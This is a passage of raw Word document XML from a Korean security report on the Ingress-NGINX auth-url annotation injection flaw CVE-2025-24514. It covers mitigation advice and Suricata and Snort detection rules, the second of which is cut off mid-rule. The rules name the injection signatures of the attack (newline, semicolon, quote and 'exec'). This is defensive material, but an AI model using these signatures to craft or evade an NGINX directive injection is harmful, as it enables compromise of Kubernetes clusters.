          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">7.5 </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>추가 권고</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E20B255" w14:textId="33B3391C" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>패치 적용 후에도 annotation validation, snippet annotation 비활성화 등 보안 옵션을 추가로 적용하는 것이 바람직합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57665493" w14:textId="3DCAE1D7" w:rsidR="002E1308" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정기적으로 Kubernetes 및 Ingress-NGINX Controller의 보안 공지와 패치 내역을 모니터링해야 합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499947E5" w14:textId="240C631B" w:rsidR="00E27F85" w:rsidRPr="002E1308" w:rsidRDefault="002E1308" w:rsidP="002E1308">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="95"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>네트워크 보안 도구(Suricata 등)와 연계하여 위협 탐지 및 대응 체계를 강화할 수 있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1867FF2D" w14:textId="77777777" w:rsidR="00E27F85" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B512CC" w14:textId="4B89B45E" w:rsidR="00E27F85" w:rsidRPr="000D7E05" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D7E05">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">8. </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53BCDF7D" w14:textId="0ADF8DE8" w:rsidR="000D7E05" w:rsidRPr="000D7E05" w:rsidRDefault="000D7E05" w:rsidP="000D7E05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D7E05">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">8.1 </w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정책</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기반</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>규칙</w:t>
      </w:r>
      <w:r w:rsidR="002E1308" w:rsidRPr="002E1308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E1308" w:rsidRPr="002E1308">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>예시</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA537E6" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>1. Suricata 규칙</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C2934E" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Annotation 주입 탐지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="330A650F" wp14:editId="30D3B8D5">
                <wp:extent cx="5422605" cy="2849525"/>
                <wp:effectExtent l="0" t="0" r="26035" b="27305"/>
                <wp:docPr id="1683673394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5" cy="284952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CC367" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                            <w:pP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text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alert http any </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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any</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 -&gt; any </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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any</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 (msg:"CVE-2025-24514: Ingress-NGINX auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 Injection Attempt";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flow:established</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd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,to_server</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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/auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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";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proofErr w:type="spellStart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http_uri</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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proofErr w:type="spellStart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pcre</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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:"/(\x5C\x6E|%0A|;|\x22)/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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i</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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";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classtype:web</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd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-application-attack</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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sid:202524514;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rev:1;)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0A650F" id="_x0000_s1046" style="width:427pt;height:2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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="01CCC367" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR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text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alert http any </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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any</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 -&gt; any </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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any</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 (msg:"CVE-2025-24514: Ingress-NGINX auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 Injection Attempt"; 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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart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flow:established</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd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,to_server</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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/auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; 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proofErr w:type="spellStart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http_uri</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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proofErr w:type="spellStart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pcre</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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:"/(\x5C\x6E|%0A|;|\x22)/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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i</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; 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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart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classtype:web</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd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-application-attack</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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; 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sid:202524514; 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rev:1;)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C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>동작 원리</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>HTTP 요청에서 auth-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> annotation에 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 문자(\n), 세미콜론(;), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>쌍따옴표</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(")가 포함된 경우 경고 발생</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E53880" w14:textId="226E1905" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>탐지 포인트</w:t>
      </w:r>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">%0A(URL 인코딩 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>), \x5C\x6E(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>역슬래시</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">+n), |(파이프) 등 NGINX directive 주입 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시그니처</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1A94BCC4" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B7DD610" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="681175A4" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EE17806" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C2D6FD7" w14:textId="77777777" w:rsidR="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EE6C815" w14:textId="5AC6801B" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2. Snort 규칙</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E66897" w14:textId="05B73A72" w:rsidR="00C748E6" w:rsidRPr="00C748E6" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C748E6">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>악성 NGINX Directive 탐지</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6062FD22" wp14:editId="1F6C85D7">
                <wp:extent cx="5422605" cy="3104707"/>
                <wp:effectExtent l="0" t="0" r="26035" b="19685"/>
                <wp:docPr id="66081279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5" cy="3104707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0CDB8" w14:textId="005E3FFA" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                            <w:pP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text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alert </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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tcp</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 any </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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any</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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 -&gt; any 6443 (msg:"CVE-2025-24514: Kubernetes Ingress-NGINX Exploit";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proofErr w:type="spellStart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flow:to_</w:t>
                            </w:r>
                            <w:proofErr w:type="gramStart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server,established</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd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;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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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/auth-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart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url</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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";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content:"|0A|"; distance:0;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proofErr w:type="spellStart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content:"exec</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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"; within:50;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metadata:service</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:proofErr w:type="gramEnd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kubernetes</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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classtype:attempted</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd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-admin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd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;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sid:202524514;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rev:1;)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62FD22" id="_x0000_s1047" style="width:427pt;height:24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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6690CDB8" w14:textId="005E3FFA" w:rsidR="00C748E6" w:rsidRPr="002E1308" w:rsidRDefault="00C748E6" w:rsidP="00C748E6">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
                          <w:lang w:eastAsia="ko-KR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text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alert </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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tcp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 any </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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any</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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 -&gt; any 6443 (msg:"CVE-2025-24514: Kubernetes Ingress-NGINX Exploit"; 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proofErr w:type="spellStart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flow:to_</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart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server,established</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd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; 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proofErr w:type="spellStart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content:"nginx.ingress.kubernetes.io</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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/auth-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart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url</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; 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content:"|0A|"; distance:0; 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proofErr w:type="spellStart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content:"exec</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd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"; within:50; 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proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart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metadata:service</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:proofErr w:type="gramEnd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 </w:t>
                      </w:r>
